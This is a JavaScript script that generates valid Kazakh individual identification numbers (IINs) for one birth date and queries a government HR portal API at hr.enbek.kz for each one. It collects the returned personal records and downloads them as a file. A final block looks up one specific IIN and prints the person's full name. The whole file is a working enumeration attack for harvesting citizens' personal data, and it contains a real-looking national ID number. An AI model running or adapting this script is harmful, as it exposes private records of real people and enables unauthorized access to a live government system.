var a = {"data" : ""}

for (let year = 2005; year < 2006; year++) {
    for (let month = 12; month < 13; month++) {
        for (let day = 5; day < 6; day++) {
            let iin = (year.toString().slice(2) + month.toString().padStart(2, '0') + day.toString().padStart(2, '0') + 5).toString();

            for (let i = 1; i < 100; i++) {
                let iinCopy = iin + i.toString().padStart(4, '0');
                let v = [];

                for (let j = 0; j < iinCopy.length; j++) {
                    v.push(parseInt(iinCopy[j]));
                }

                let is_actual = false;
                let n12 = (1 * v[0] + 2 * v[1] + 3 * v[2] + 4 * v[3] + 5 * v[4] + 6 * v[5] + 7 * v[6] + 8 * v[7] + 9 * v[8] + 10 * v[9] + 11 * v[10]) % 11;

                if (n12 === 10) {
                    n12 = (3 * v[0] + 4 * v[1] + 5 * v[2] + 6 * v[3] + 7 * v[4] + 8 * v[5] + 9 * v[6] + 10 * v[7] + 11 * v[8] + 1 * v[9] + 2 * v[10]) % 11;
                    if (n12 !== 10) {
                        is_actual = true;
                    }
                } else {
                    is_actual = true;
                }

                if (is_actual) {
                    v.push(n12);
                    iinCopy = v.join('');
                    //console.log(iinCopy);
                    var xhr = new XMLHttpRequest();
                    xhr.onreadystatechange = function() {
                        if (xhr.readyState == 4 && xhr.status == 200) {
                            a.data += xhr.responseText + '\n';
                        }
                    };
                    xhr.open("GET", "https://hr.enbek.kz/api/contract/universalMethods/requestFlData?iin="+iinCopy, true);
                    xhr.send();
                }
            }
        }
    }
}

console.log("Downloading...")

let blob = new Blob([JSON.stringify(a)], {type: 'text/plain'})
let url = URL.createObjectURL(blob)
let downloadLink = document.createElement('a')
downloadLink.download = 'results.txt'
downloadLink.href = url
downloadLink.click()









var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        console.log(xhr.responseText);
        jsonObj = JSON.parse(xhr.responseText);
        console.log(jsonObj["fullNamePerson"])
    }
};
xhr.open("GET", "https://hr.enbek.kz/api/contract/universalMethods/requestFlData?iin=051205501834", true);
xhr.send();